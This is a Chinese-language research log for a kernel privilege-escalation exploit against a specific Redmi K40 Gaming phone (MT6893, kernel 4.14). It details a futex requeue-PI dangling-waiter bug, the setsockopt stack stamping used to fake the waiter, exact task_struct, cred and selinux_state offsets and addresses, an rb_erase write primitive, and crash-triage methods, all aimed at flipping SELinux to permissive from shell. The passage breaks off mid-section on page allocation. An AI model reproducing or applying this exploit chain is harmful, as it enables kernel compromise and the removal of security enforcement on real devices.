# GhostLock · ares 适配 —— 完整技术发现

> 本文是研究过程的**完整结论集**。每条结论都标注证据来源与等级。
> 证据分级：**A** = 本机直接观测 / **B** = 反汇编或源码原文 / **C** = 推导 / **D** = 推测（禁止当结论）
>
> 最后更新：2026-10-27（P3 定案 + gK109 实跑 + WD_FL 探针作废之后）

---

## 0. 目标与约束

| 项 | 值 |
|---|---|
| 设备 | Redmi K40 游戏增强版（`ares`） |
| SoC | MediaTek Dimensity 1200 / MT6893 |
| 系统 | Android 13 / HyperOS 1.0 |
| 内核 | `4.14.186-g844fd19c6` |
| 分区 | A/B |
| Bootloader | 已锁，官方解锁通道关闭 |
| 起点权限 | `uid=2000(shell)`，SELinux `Enforcing`，`u:r:shell:s0` |

**唯一可行路**：内核提权（CVE-2026-43499）。
目标：把内核里的 `selinux_state.enforcing` 写成 0，令 `getenforce` 变 `Permissive`。

### 观测能力（极受限）

| 可读 | 不可读 |
|---|---|
| `/data/vendor/aee_exp/db_history`（明文 CSV，584 条） | `/proc/kallsyms` |
| `/data/vendor/aee_exp/db.fatal.NN.*/ZZ_INTERNAL`（崩点明文） | `dmesg` / `/dev/kmsg` |
| 用户态 ckpt 打点日志 | `/sys/fs/pstore` / `/proc/last_kmsg` |
| `/proc/meminfo`、`/proc/zoneinfo`、`/sys/kernel/slab/*` | `/data/tombstones` |
| `/proc/config.gz` | `db.fatal.NN.*.dbg`（**已加密，熵满，无明文**） |

⇒ **取不到 fault address、取不到崩溃寄存器**（除早期一次侥幸拿到的 `last_kmsg`）。
⇒ 替代方案：用**崩点形态**反推中间状态（见 §7）。这是本项目最重要的方法论创新。

---

## 1. 漏洞机理（A 级，源码 + 反汇编 + 上机实证）

线程布局：**A**（waiter 线程）、**B**（占锁者）、**C**（触发者/main）、**D**（parker）

```
1. A: FUTEX_LOCK_PI(f_pi_chain) 持锁
2. B: FUTEX_LOCK_PI(f_pi_target) 持锁，再 LOCK_PI(f_pi_chain) 阻塞 → 死锁环
3. A: FUTEX_WAIT_REQUEUE_PI(&f_wait, &f_pi_target)，rt_waiter 落在 A 的内核栈（T-0x190）
4. C: FUTEX_CMP_REQUEUE_PI → rt_mutex_start_proxy_lock → task_blocks_on_rt_mutex
      → rtmutex.c:964   task->pi_blocked_on = waiter
      → 死锁检测 → -EDEADLK                     [实测 cmp_errno = 35]
5. rtmutex.c:1805 ret!=0 → remove_waiter(lock, waiter)
      → rtmutex.c:1079 清的是 current(=C) 的 pi_blocked_on，【A 的仍悬空】
      → futex.c:2268   失败分支 break，不清 A 的
6. A 1s 超时 → q.key != key2 → handle_early_requeue_pi_wakeup 返回 -ETIMEDOUT
      → `goto out_put_keys`，【绕过 wait_proxy_lock / cleanup_proxy_lock】
   ★ 所以 pi_blocked_on 是【永久悬空】，不是只有 1s 的窗口
7. C: sched_setattr(A_tid, OTHER=0, nice=10) → rt_mutex_adjust_pi(A)
      → rt_mutex_adjust_prio_chain → 读悬空 waiter->lock → _raw_spin_trylock
```

> ⚠️ **第 7 步的 `policy` 必须从 `BATCH` 改成 `OTHER`**，否则 `core.c:5520` 早退
> （`policy == p->policy` 且 nice 相同 ⇒ `return 0`，根本不进 PI walk）。
> 这是历史上 13 次误归因的根源。

**统计**（全量 `db_history`）：`KE 176` / `HWT 54`；
`33 次 KE` 中形态 A（`trylock+0x1c`）29 次、形态 B（`adjust_prio_chain+0x14c`）4 次。

---

## 2. 栈几何：`STAMP_WAITER_OFF = 0x80`（A + B 双证）

`T` = 用户态进入 syscall wrapper 时的 SP。

### futex 链

| 函数 | 序言 | 累计 |
|---|---|---|
| `SyS_futex` | `sub sp,sp,#0x70`；`add x29,sp,#0x20` | `x29 = T-0x50` |
| `do_futex` | `stp x29,x30,[sp,#-96]!`；`sub sp,sp,#0x1b0` | `x29 = T-0xD0` |
| — | `0x8170760  sub x0,x29,#0xc0` | **`rt_waiter = T-0x190`** |

### setsockopt 链（每层逐条 objdump 确认）

| 函数 | 序言 | 累计 |
|---|---|---|
| `SyS_setsockopt @0x8e65a40` | `stp x29,x30,[sp,#-80]!` | `T-0x50` |
| `sock_common_setsockopt @0x8e714f4` | `stp x29,x30,[sp,#-16]!` | `T-0x60` |
| `udp_setsockopt @0x8f4bc28` | `stp x29,x30,[sp,#-16]!` | `T-0x70` |
| `ip_setsockopt @0x8f1bc3c` | `stp x29,x30,[sp,#-48]!` | `T-0xA0` |
| `do_ip_setsockopt @0x8f1bcc8` | `sub sp,sp,#0x190` | `T-0x230` |
| **buf** | `0x8f1c0fc  add x0,sp,#0x20` | **`buf = T-0x210`** |

⇒ **`off = 0x210 - 0x190 = 0x80`**

### ⚠️ 为什么 `sock_common_setsockopt` 这一帧必须有（关键，曾错在这里）

```c
// net/ipv4/af_inet.c:956-970
const struct proto_ops inet_dgram_ops = {
    .setsockopt = sock_common_setsockopt,   // ★
```

```
SyS_setsockopt+0xb0:
    ldr x8,[x23,#40]    ; x8 = sock->ops
    ldr x8,[x8,#104]    ; x8 = ops->setsockopt = sock_common_setsockopt
    blr x8
```

```
sock_common_setsockopt @0x8e714f4（全文仅 8 条）:
    stp x29,x30,[sp,#-16]!   ; ★ 这 0x10 帧真实存在
    ldr x0,[x0,#32]          ; sock->sk (0x20)
    ldr x8,[x0,#40]          ; sk->sk_prot (0x28)
    ldr x8,[x8,#64]          ; sk_prot->setsockopt (0x40) = udp_setsockopt
    blr x8
```

⇒ 两层间接：`sock->ops->setsockopt` → `sk_prot->setsockopt`。

**覆盖安全性**：`optname=46` 走 `ip_mc_source`，栈帧 `sub sp,#0xb0`，
序言最大写到 `sp+0xA0 = T-0x230`，**未触及 `T-0x158`**（lock 所在）
⇒ 后续栈帧不会覆盖 stamp。

---

## 3. buf 字段映射（`off = 0x80`）

`waiter = buf + 0x80`；`waiter` 字段 `X` 对应 `buf[X-0x80]`。

| waiter 字段 | 偏移 | buf 偏移 |
|---|---|---|
| `tree_entry.pc` | 0x00 | 0x80 |
| `tree_entry.rb_right` | 0x08 | 0x88 |
| `tree_entry.rb_left` | 0x10 | 0x90 |
| `pi_tree.pc` | 0x18 | 0x98 |
| `pi.rb_right` | 0x20 | 0xA0 |
| `pi.rb_left` | 0x28 | 0xA8 |
| **`task`** | 0x30 | 0xB0 |
| **`lock`** | 0x38 | 0xB8 |
| **`prio`** | 0x40 | 0xC0 |
| **`deadline`** | 0x48 | 0xC8 |

全部 `< 0x108` ⇒ **单次 `setsockopt(optlen=0x108)` 就能覆盖完整 0x50 字节 waiter**。

**stamp 生效的铁证**（A 级）：

| 配置 | 结果 |
|---|---|
| `optlen=0x88`（覆盖到 buf 0x88 < 0xB8，**不碰 lock**） | `KE +0x65c`（`BUG_ON`，lock 仍是真实锁） |
| `optlen=0x108`（覆盖 0xB8，**含 lock**） | `KE at _raw_spin_trylock+0x1c`（lock 已被改成 FAKE_LOCK） |

⇒ 唯一变量是"是否覆盖 `waiter->lock`" ⇒ stamp 写入成功。

**`errno=22` 的来源**：`optname=46` 时 `copy` 在 family 校验**之前**执行；
`-22` 来自 `ip_mc_source()` 的业务失败，而 `copy_from_user` 已执行
⇒ **反证 `buf` 起点 = `T-0x210`**。

---

## 4. 结构体布局（源码 + 反汇编双证）

### `rt_mutex_waiter`（共 `0x50`）· `[B] rtmutex_common.h:27`

| 偏移 | 字段 |
|---|---|
| 0x00 | `tree_entry.rb_parent_color` |
| 0x08 | `tree_entry.rb_right` |
| 0x10 | `tree_entry.rb_left` |
| 0x18 | `pi_tree_entry.rb_parent_color` |
| 0x20 | `pi_tree_entry.rb_right` |
| 0x28 | `pi_tree_entry.rb_left` |
| 0x30 | `task` |
| 0x38 | `lock` |
| 0x40 | `prio` |
| 0x48 | `deadline` |

`CONFIG_DEBUG_RT_MUTEXES=n` ⇒ 无 `ip` / `deadlock_*` 字段。
`[B] task_blocks_on_rt_mutex: stp x20,x19,[x22,#48]` → task/lock；`str w8,[x22,#64]` → prio；`str x10,[x22,#72]` → deadline。

### `rt_mutex`（共 `0x20`）

| 偏移 | 字段 |
|---|---|
| 0x00 | `wait_lock` |
| 0x08 | `waiters.rb_root` |
| 0x10 | `waiters.rb_leftmost` |
| 0x18 | `owner` |

`[B] ldr x8,[x0,#24]; and x23,x8,#~1` → owner `0x18` ✓

### `task_struct`（反汇编，**已修正三处历史错值**）

| 字段 | 偏移 | 备注 |
|---|---|---|
| `usage` | **0x040** | 曾错记 0x10 |
| `prio` | 0x084 | |
| `normal_prio` | **0x08C** | 曾错记 0x88 |
| `tasks` | 0x5E8 | 曾错记 0x638 |
| `deadline` | 0x388 | |
| `real_cred` | 0x788 | |
| `cred` | 0x790 | |
| `comm` | 0x798 | |
| `pi_lock` | 0x85C | |
| `pi_waiters` | 0x868 | |
| `pi_top_task` | **0x878** | 曾错记 0x870 |
| `pi_blocked_on` | **0x880** | |
| `atomic_flags` | 0x838 | 曾错记 0xA88 |

**几何自洽性**：`pi_waiters@0x868` 占 `0x868..0x877`（`rb_root_cached = 0x10`）
→ `pi_top_task@0x878` → `pi_blocked_on@0x880`，严丝合缝无空隙。
⇒ 旧值 `0x870` 落在 `pi_waiters` 内部（= `rb_leftmost`），**几何上不可能**。

**危害链**（曾导致连续多轮 HWT）：
`0x870` 被当成 `pi_top_task` 写入，实际是 `rb_leftmost`；内核读 `0x878` 得 0
⇒ 提前返回条件 `p->pi_top_task == pi_task` 失败 ⇒ 进 `__task_rq_lock`/`dequeue_task`/`put_prev_task`
⇒ 对垃圾 `fake_task` 必然挂死 ⇒ **HWT**。

> ★ 教训：**探针不能用待验证的偏移表自身读数自证**。
> `pk_faketask_pitop` 用 `0x870` 读回自己按 `0x870` 写的值 ⇒ 与内核真正读的 `0x878` 无关。

### `cred`

`[B] prepare_creds @0x80e3e30  mov w2,#0xa8` → `bl __memcpy`
⇒ **copy size = 0xA8（168），不是 0xB8**。

| 偏移 | 字段 | | 偏移 | 字段 |
|---|---|---|---|---|
| 0x00 | usage | | 0x38 | cap_permitted |
| 0x04 | uid | | 0x40 | cap_effective |
| 0x08 | gid | | 0x48 | cap_bset |
| 0x0C | suid | | 0x50 | cap_ambient |
| 0x10 | sgid | | 0x78 | security |
| 0x14 | euid | | 0x98 | non_rcu |
| 0x18 | egid | | | |
| 0x1C | fsuid | | | |
| 0x20 | fsgid | | | |
| 0x28 | securebits | | | |
| 0x30 | cap_inheritable | | | |

`[A] /sys/kernel/slab/cred_jar = :A-0000192`；caps 实际值 `0x3fffffffff`（38 位）。

### SLUB 对象真实大小（`[A] ls -l /sys/kernel/slab/<name>` 看符号链接名）

| 缓存 | 大小 |
|---|---|
| `mm_struct` | **896** ← 官方 5.15/6.1 用 1024，其他移植版用 1280，**都错** |
| `cred_jar` | 192 |
| `vm_area_struct` | 192 |
| `files_cache` | 704 |
| `signal_cache` | 1024 |
| `task_struct` | 3712 |

`[B] slub.c:5713-5742 create_unique_id: sprintf(p, "%07d", s->size)`
⇒ **链接名里的数字就是 `s->size`**，这是权威来源。

### 4.14 `struct file_operations`

`[B] read_iter 0x20 | splice_read 0xC8 | __stack_chk_guard 0x1C4DAC8`
⚠️ **4.19 用 `.read`/`.write` 槽，不能照抄。**

---

## 5. 符号与地址换算

### 地址常量（三路互验）

| 常量 | 值 |
|---|---|
| `KIMAGE_TEXT_BASE` | `0xffffff8008080000`（`_stext @ 0xffffff8008080800`） |
| `PAGE_OFFSET` | `0xffffffc000000000` |
| `kernel_phys_load` | `0x40080000` |
| `P0_PHYS_OFFSET` | `0x40000000` |
| `image_size` | `0x3db4000` |

`[B] arch/arm64/include/asm/memory.h:68`
`PAGE_OFFSET = ~(1<<(VA_BITS-1))+1`；`VA_BITS=39` ⇒ 空间 `2^38 = 256 GiB`。

⚠️ **`kernel_phys_load` 必须保持 `0x40080000`**，改成 `0x40000000` 会让 base 退化 `-0x8000000`。

**换算公式**：
- `offset = 真值VA - 0xffffff8000080000`（等价于 `静态offset + 0x8000000`）
- direct map：`VA = PAGE_OFFSET + (PA - 0x40000000)`

> ★ 曾反复误判的原因：两条路算出同一个数，对错颠倒也看不出来
> ⇒ **必须用 kallsyms 外部真值核对**。

### DRAM 真实上界 = `0x240000000`（9 GiB）

`[A] /proc/zoneinfo`：

| zone | start_pfn | spanned |
|---|---|---|
| DMA | 262144 | 786432 |
| Normal | 1048576 | 1159168 |
| Movable | 2207744 | 151551 |

最高 present pfn = `2207744 + 151551 - 1 = 2359294` ⇒ 最高 PA = `0x240000000`。
`[A] MemTotal = 7692468 kB`（7.336 GiB）—— **可用页总和，不是最高物理地址**。
⇒ `identity_end = 0xffffff8200000000` 恰好正确。

### ★★★ D 型数据符号表（`syms7.txt`，57019 行）—— **名字↔地址配对不可靠！**

| 地址 | 符号 | 状态 |
|---|---|---|
| `ffffff8009cdbec0` | `init_task` | ✅ 已验证 |
| `ffffff8009ce9158` | `init_cred` | ✅ 已验证 |
| `ffffff8009ccdb78` | `root_task_group` | ✅ 已验证 |
| `ffffff8009cd1500` | `nfulnl_logger` | |
| `ffffff800a12e928` | `boot_id` / `sysctl_bootid` / `random_boot_id`（同址） | |
| `ffffff8009cd1420` | `loggers` | |
| `ffffff800a0ff2a8` | `security_hook_heads` | |
| `ffffff800a100b08` | **`selinux_state`** | ★ 更正（原标 `0xa100b00`，错一格） |
| `ffffff800a100b28` | **`selinux_enforcing_boot`** | ★ 更正（原标名 `selinux_enforcing`；源码**无此变量**） |
| `ffffff800a100b00` | （未知 8 字节变量） | ★ 更正（原标为 `selinux_blob_sizes`，无证据） |

> ★★ **教训**：`syms7.txt` 的 D 型符号「名字 ↔ 地址」配对**不可靠**，
> 推测是 kallsyms 压缩名解码时漏符号导致后续串位。
> **使用任何 D 型符号前，必须用反汇编独立验证。**

**文本符号（`[A]`）**：
`commit_creds = 0xffffff80080e41e0` / `prepare_kernel_cred = 0xffffff80080e4578`

⚠️ `KALLSYMS_ALL` 未开 ⇒ `vmlinux.elf` **完全无数据符号**（`nm` 只有 T/t/W，57005 条）。

**`empty_zero_page = 0x01C4E298`**（不在符号表，靠反汇编算出）
`[B] init_zero_pfn @0x800971e9b4: adrp 0x9cce000; add #0 → str x8,[x9,#664]`；`664 = 0x298`。

> ★ **objdump 符号重叠陷阱**：`_raw_spin_trylock` 与 `__cpuidle_text_end`
> **同一地址 `0x90e5838`**，objdump 会把 `bl 0x90e5838` 显示成 `<__cpuidle_text_end>`
> ⇒ `grep '<_raw_spin_trylock>'` **永远搜不到调用者**。
> 正确调用点：`adjust_prio_chain+0xfc` → `0x813492c mov x0,x24` / `0x8134930 bl 0x90e5838`。

---

## 6. ★ 写原语与写目标（P3 定案）

### 写原语路径

`rb_erase_cached @ 0xffffff80090d57c0`：

```
0x57c0  ldp  x9,x8,[x0,#8]   ; x9=rb_right, x8=rb_left
0x57d8  cbz  x8,+0x12c       ; left==0 ⇒ 无子分支（= 写原语路径）
0x57dc  cbz  x9,+0x78        ; left!=0 && right==0 ⇒ 单子分支
0x57e0  ldr  x10,[x9,#16]    ; left!=0 && right!=0 ⇒ 双子树
```

写原语（走 `+0x12c`）：

```
0x58ec  ldr  x10,[x0]        ; pc = node->__rb_parent_color
0x58f0  ands x8,x10,#~3      ; P = pc & ~3
0x58f4  b.eq 0x5914          ; P==NULL ⇒ 改 root->rb_node
0x58f8  ldr  x11,[x8,#16]    ; P->rb_left
0x58fc  cmp  x11,x0
0x5900  b.eq 0x5a50          ; P->rb_left==node ⇒ 改 P->rb_left
0x5904  str  x9,[x8,#8]      ; ★ P->rb_right = x9 = node->rb_right  ← 写原语
0x5908  cbz  x9, 0x591c
0x590c  str  x10,[x9]        ; 有 right 时 child->pc = pc
0x5910  ret
0x591c  tbz  w10,#0, 0x5a44  ; ★ pc bit0==0 (RED) ⇒ 直接 ret，不进 rebalance
0x5920  cbz  x8, 0x5a44      ; parent==0 ⇒ ret
0x5924  ...                  ; ____rb_erase_color 内联
```

**关键结论**：
- 写入量 = **8 字节**（`str x9`，`x9 = node->rb_right = stamp 设的 0`），**不是 1 字节**
- stamp 默认写 `left=0 / right=0 / pc=P` ⇒ **正好走这条路**
  ⇒ **只要 payload 落页，写原语就成**

### 写目标

| | 地址 | offset |
|---|---|---|
| ✅ **正确** | `0xffffff800a100b08` = `&selinux_state` | **`0x02080B08`** |
| ❌ 作废 | `0xffffff800a100b28` = `selinux_enforcing_boot` | `0x02080B28` |

**`0xffffff800a100b28` 是 `selinux_enforcing_boot`**：

```
[B] enforcing_setup @0xffffff800973047c:
    0x97304a8  adrp x9, 0xffffff800a100000
    0x97304b4  str  w8, [x9, #2856]   ; 2856 = 0xB28 ⇒ *(0xa100b28) = enforcing ? 1 : 0
```

```c
// security/selinux/hooks.c:107-116
static int selinux_enforcing_boot;
static int __init enforcing_setup(char *str) {
    if (!kstrtoul(str,0,&enforcing)) selinux_enforcing_boot = enforcing ? 1 : 0;
    return 1; }
__setup("enforcing=", enforcing_setup);
```

⇒ **`static int`，仅 `__init` 期读一次，运行期不再被读**。
⇒ **改它 = 改一个死变量，`getenforce` 完全不受影响。**
⇒ **历史上所有"写原语成功但 `getenforce` 没变"的轮次，很可能都是写到了这里。**

**运行时真开关**：`struct selinux_state.enforcing`（`bool`，结构体 `+1`）

```c
// security/selinux/include/security.h:99-110
struct selinux_state {
    bool disabled;        // +0
    bool enforcing;       // +1  ← CONFIG_SECURITY_SELINUX_DEVELOP=y 时存在
    bool checkreqprot;    // +2
    bool initialized;     // +3
    bool policycap[__POLICYDB_CAPABILITY_MAX];  // +4..
    bool android_netlink_route;
    struct selinux_avc *avc;   // +16
    struct selinux_ss  *ss;    // +24
};
```

```
[B] selinux_init @0xffffff8009730544:
    0x9730580  adrp x9,  0xffffff800a100000
    0x9730584  ldr  w10, [x20, #2856]    ; selinux_enforcing_boot (0xa100b28)
    0x9730588  ldr  w9,  [x9,  #2860]    ; selinux_checkreqprot_boot (0xa100b2c)
    0x9730590  add  x8,  x8, #0xb08      ; ★ x8 = &selinux_state = 0xa100b08
    0x97305a4  stp  xzr, xzr, [x8]       ; ★ memset 起点 = 结构体起点 = 0xa100b08
    0x97305ac  str  xzr, [x0, #24]!      ; pre-index 写回 ⇒ x0 = 0xa100b20 = &state->ss  (+24) ✓
    0x97305b4  str  xzr, [x19, #16]!     ; pre-index 写回 ⇒ x19 = 0xa100b18 = &state->avc (+16) ✓
    0x97305b8  strb w10, [x8, #1]        ; state->enforcing (bool @+1)
    0x97305bc  strb w9,  [x8, #2]        ; state->checkreqprot
    0x97305c0  bl   selinux_ss_init      ; x0 = 0xa100b20
    0x97305c8  bl   selinux_avc_init     ; x0 = 0xa100b18
```

**布局定案（三重自洽）**：
1. `memset` 起点 = `b08` ⇒ 结构体起点 = `b08`
2. `memset` 覆盖 `b08..b27`（16 + 8 + 8）= **32 字节 = 0x20**
3. pre-index 写回值恰好等于 `&ss(+24)=b20` 与 `&avc(+16)=b18`，与源码完全对应

⇒ **`&selinux_state = 0xffffff800a100b08`**，大小 `0x20`
⇒ offset = **`0x02080B08`**；`enforcing` 字段地址 = `0xffffff800a100b09`

### 8 字节写的影响面

`target = b08`，`P = target-8 = b00`，一次 8 字节清零覆盖 `+0..+7`：

| 偏移 | 字段 | 影响 |
|---|---|---|
| +0 | `disabled` | 0（本来就是 0）✓ |
| +1 | **`enforcing`** | **0 ⇒ `getenforce` 变 0，目标达成** ✓ |
| +2 | `checkreqprot` | 0 ✓ |
| +3 | `initialized` | 0 ← 已评估，可接受 |
| +4..+7 | `policycap[0..3]` | 0（本来就是 0）✓ |

`avc(@+16=0xb18)` / `ss(@+24=0xb20)` **不在 8 字节写范围内，完好** ✓

**`initialized=0` 的后果评估**（已查源码，可接受）：
- `hooks.c:286` → 变短路，**少做 inode 重校验**，不崩，方向是更宽松而非更严
- `hooks.c:635/758/1046` → mount 选项校验"更早返回"，属放宽
- `hooks.c:7115 selinux_disable` → 不允许再 disable，无影响

**为何不写 `b09`**：虽然 8 字节写 `b09` 也能清 `enforcing` 且不碰 `avc`，
但 `P` 会变成 `b01`（**非 8 字节对齐**），而 `b08` 方案 `P=b00` 对齐更干净，
且 `b00` 是 `.bss` 全零 ⇒ `P->rb_left = 0 != node` 必然成立，写路径落 `P->rb_right` 无歧义。

### ★ 致命陷阱：`pc` 颜色位必须为 RED（bit0 = 0）

```c
// lib/rbtree_augmented.h
#define RB_RED 0
#define RB_BLACK 1
#define __rb_color(pc)     ((pc) & 1)
#define __rb_is_black(pc)  __rb_color(pc)      // bit0==1 → 黑
#define __rb_is_red(pc)    (!__rb_color(pc))   // bit0==0 → 红
```

Case1 源码：
```c
pc = node->__rb_parent_color;
parent = __rb_parent(pc);
__rb_change_child(node, child, parent, root);
if (child) { child->__rb_parent_color = pc; rebalance = NULL; }
else rebalance = __rb_is_black(pc) ? parent : NULL;
```

- **`pc = P|1`（bit0=1，BLACK）** ⇒ `rebalance = parent = P` ⇒ 进入 `____rb_erase_color(P)`
  ⇒ 循环第一步 `sibling = parent->rb_right`（= 刚写的 0），`node == sibling` 分支
  ⇒ `ldr x9,[x8,#16]` 取 `P->rb_left`，再 `ldrb w10,[x9]` **解引用 `P->rb_left`**
  ⇒ `P` 在 `.bss`（全 0），`P->rb_left = 0` ⇒ **读 `*(0)` ⇒ kernel oops/panic**
- **`pc = P`（bit0=0，RED）** ⇒ `tbz w10,#0` → 跳 `0x5a44` ⇒ **直接 ret，无 rebalance，不崩**

⇒ 当前代码 `main.c:445  pc_v = (uintptr_t)(P & ~3UL)` **正确**。

### ⚠️ 方向相反的另一处（极易搞混）

| 场景 | 节点 | `pc` 必须 |
|---|---|---|
| **erase 侧**：被 stamp 的悬空 waiter | `task->pi_blocked_on` | **bit0 = 0（RED）** |
| **enqueue 侧**：插入时作为 parent 的 `w1` | `w1+0x00` 与 `w1+0x18` | **= 1（BLACK）** |

`w1` 若为 RED，`__rb_insert` 会不 break、取 `gparent = rb_red_parent(parent) = NULL`，
再 `gparent->rb_right` 解引用 `NULL+8` ⇒ 自旋挂死 ⇒ HWT。

---

## 7. ★ 崩点判据表（替代拿不到的 fault address）

`[B] _raw_spin_trylock @ 0xffffff80090e5838`：

```
+0x00  stp x29,x30,[sp,#-16]!
+0x04  mov x29,sp
+0x08  mrs x8,sp_el0 / preempt_count++
+0x18  prfm pstl1strm,[x0]   （不 fault）
+0x1c  ldaxr w9,[x0]         ★ 崩点（读）
+0x70  函数总长度
```

> `+0x1c/0x70` 里的 `/0x70` 是**函数总长度**，不是另一个偏移。

| 崩点 | 含义 | 下一步 |
|---|---|---|
| `KE at _raw_spin_trylock+0x1c` | `x0` 指向**未映射页** ⇒ payload 未落页（或泄漏假阳性） | 查 payload 几何 / stamp |
| `KE at _raw_spin_trylock+0x70` | 同上，不同内联展开 | 同上 |
| **HWT**（硬挂，无崩点） | `trylock` 失败 ⇒ `goto retry` 无限自旋 ⇒ `fake_lock` 处 u32 ≠ 0 ⇒ payload 未落页 | 查落页链 |
| `KE at rt_mutex_adjust_prio_chain+0x14c` | 页**已映射**但 `*(fake_lock+0x10)` 无效（内容不是 payload） | 查 payload 内容 |
| `KE at rt_mutex_adjust_prio_chain+0x65c` | `BUG_ON(w->lock != lock)`，页已映射但锁树错 | 用 `prio=200` 缓解 |
| `KE at rb_erase_cached+0x30` | 被 erase 节点是**双子树**（`left!=0 且 right!=0`） | 查 `STAMP_LEFT` / `LEGACY_SHAPE` / 是否 erase 到目标 waiter |
| `KE at rb_erase_cached+0x3dc` | rb_erase 内另一路径 | 已进入写原语阶段 |

`[B] adjust_prio_chain` 关键点：
```
+0x144  tbz w28,#0,+0x1ec    ; requeue=false ⇒ 跳过 rb_erase
+0x148  ldr x27,[x24,#16]    ; lock->waiters.rb_leftmost
+0x14c  ldr x8,[x27,#56]     ; leftmost_waiter->lock (+0x38)   ← 崩点
+0x150  cmp x8,x24
+0x154  b.ne +0x65c          ; BUG_ON（brk #0x800）
+0x16c  bl rb_erase_cached   ; ★ 写原语入口
```

### fault address 取证：已确认拿不到

```c
// rtmutex.c:578-585
lock = waiter->lock;
raw_spin_trylock(&lock->wait_lock);
```
`[B]` 调用点 `0x813492c mov x0,x24`；入口到崩点**无一条指令写 x0** ⇒ `x0` = fault address。

✗ AEE 文本报告只有重启后日志
✗ `db.fatal.*.dbg` 已加密
✗ kallsyms / pstore / last_kmsg 全部 denied
✗ 5 个 AEE 包里 `"virtual address"` 后的值**全为空**（AEE 脱敏）

⇒ **改用崩点判据，已足够区分页是否映射。**

### `+0x30` 的真实语义（曾误读）

`+0x30 = 循环第二次解引用` ⇒ **被 erase 节点是双子树**。

旧写法「stamp 命中 ⇒ `left=0` ⇒ 走 `+0x12c` ⇒ 不可能到 `+0x30`」**不完备**，
漏了前提：`stamp_buf` 的 left 值由 `STAMP_LEFT` 环境变量决定（默认 0），
且 `STAMP_LEGACY_SHAPE=1` 时 `left=target`（非 0）。

**正确表述**：「stamp 命中 **且 `STAMP_LEFT=0` 且未开 `LEGACY_SHAPE`** ⇒ 走 `+0x12c` ⇒ 不到 `+0x30`」

`[A] gK92 run9` 反例：`stamp_off=128 / optlen=264 / errno=99` 三项全生效，
却仍崩 `+0x30` ⇒ **证明「stamp 生效」≠「left 被写成 0」**。

### 区分「挂死 vs 崩溃」

- **panic** 会自动重启，不会长静默
- **HWT**（硬件看门狗）= 系统冻结，`/sdcard` 长时间无新文件
  判据：`find /sdcard -maxdepth 3 -newermt 'A' ! -newermt 'B' -type f | wc -l` 长时间为 0
- 看 `bootreason`：`kernel_panic`（崩）/ `Watchdog`（挂死）
  ⚠️ `bootreason` 是持久属性，**可能是陈旧值** ⇒ 必须配 `uptime` 连续递增

### AEE 取证标准流程

```bash
# 1. 唯一硬判据
getenforce
# 2. 崩点分布统计
grep -ao 'KE at [a-z_0-9]*+0x[0-9a-f]*' /data/vendor/aee_exp/db_history | sort | uniq -c | sort -rn
# 3. 新目录
ls -lt /data/vendor/aee_exp/          # 看 db.fatal.NN.KE / .HWT
cat /data/vendor/aee_exp/db.fatal.NN.*/ZZ_INTERNAL     # 崩点明文
```

`[A]` 2026-10-26 实测分布：`166 trylock+0x1c` / `17 prio_chain+0x14c` / `5 rb_erase+0x30` / `2 +0x65c` / `1 +0xbc`

### 泄漏质量判据

- `bf_tol_hits == 1` **且** `best_hits == 4` ⇒ **唯一解 + 满分，最理想且可信**
- `best_hits == 3` ⇒ **必是假阳性**
  （同一真 `mm_struct` 下，5 个固定 futex 地址的 `base_hash` 必然全部相等 ⇒ 真值 hits 恒 = 4）
- 唯一真正无效的是 `bf_mm_sz` 不合理（非 `0x1C00` 或 `0x380` 量级）
- 线性映射上界：`gk58_lin` 必须 `< 256 GiB`（`VA_BITS=39`）

> ⚠️ `gk58_phys_ok` **只检查 `lin < 256GiB`**（linear map 容量），**不是物理地址上界**。
> `g38_phys` 高达 406 GB 是正常现象：`lin = PA - memstart_addr`（`memstart_addr` 被 KASLR 随机化）。

**`mm_struct` 在 base 内的偏移不是常数**（实测：`0x0 / 0x380 / 0x1880 / 0x2A00 / 0x5780`）
⇒ 「`mm_struct` 必在 base 偏移 0」的假设**错误**，payload 布局不能依赖此假设。

---

## 8. ★ payload 落页：唯一卡点

### 完整因果链（逐层已证）

**第 1 层：payload 写在哪里**
`[B]` `sendmsg` 的 frag 数据由 skb 的 **order-3 frag 页**承载。
payload 写入偏移 = `page_base + SKB_FRAG_BIAS(0xEC0) + payload_off`。**fake_lock 指针侧不带 BIAS。**
⇒ 这一层现在是对的，**不要再改 BIAS**。

**第 2 层：base 页如何产生**
`base = leaked_mm_struct & ~0x7fff`（order-3 复合页，8 页对齐）。
`mm_struct` 由 `dup_mm/fork` 在 `kmem_cache(mm_cachep)` 分配，一个 order-3 slab 页（32 KB）装 36 个对象。
`[B] bf_mm_struct` 页内偏移 `0x1C00 / 0x380 = 8` ⇒ `pre_ctx` 与 `child_leak` 同页。

**第 3 层：base 页何时归还 buddy（SLUB 三道门）**
```c
// mm/slub.c
① inuse == 0            // 所有对象释放
② was_frozen == 0       // 不在 cpu_partial 冻结态
③ node->nr_partial >= min_partial(5)   // 否则留在 partial 不 discard
```
`[A]` `cpu_partial=13` / `min_partial=5`，公式已验。
`[A gK108]` `slab_before_ctx_late_close = 428520` → `slab_after_ctx_late_close = 428520`（**完全不变**）
⇒ **frozen 模型得到直接验证**。
但 `[A]` unfreeze 确实在 `kill 700` 时发生，而 slab 总噪声 **14.46 MB 远大于 32 KB 信号**
⇒ **无法用 slab 判断**（教训：判据幅度必须大于噪声）。

**第 4 层：`sendmsg` 能否拿到 base 页**
```c
// net/core/skbuff.c:5210-5266
for (i = 0; npages > 0; i++) {
    int order = max_page_order;
    while (order) {
        if (npages >= 1 << order) {
            page = alloc_pages((gfp_mask & ~__GFP_DIRECT_RECLAIM) |
                    __GFP_COMP | __GFP_NOWARN | __GFP_NORETRY, order);
            if (page) goto fill_page;
            order = 1;            // ★ 失败后先试 order-1
            max_page_order = 0;   // ★ 然后永久降为 order-0
        }
        order--;
    }
    page = alloc_page(gfp_mask);
```
`[B] net/unix/af_unix.c:1705` → `max_page_order = PAGE_ALLOC_COSTLY_ORDER = 3`

**关键**：gfp 里**去掉了 `__GFP_DIRECT_RECLAIM`，且带 `__GFP_NORETRY`**
⇒ order-3 分配失败时**不会等待、不会回收**，直接降级 order-1 → order-0
⇒ **"先占满 `free_area[3]` 再让 base 页成为唯一页"这条策略结构性不可行**
（占满后 `sendmsg` 直接降级，不会等 base 页回来）

### ★★ 最关键的纠正：`__free_one_page` 默认是 `list_add`（队首）

```c
// mm/page_alloc.c:898-999
max_order = min(MAX_ORDER, pageblock_order + 1);
continue_merging:
while (order < max_order - 1) { ...合并 buddy... order++; }
done_merging:
  set_page_order(page, order);
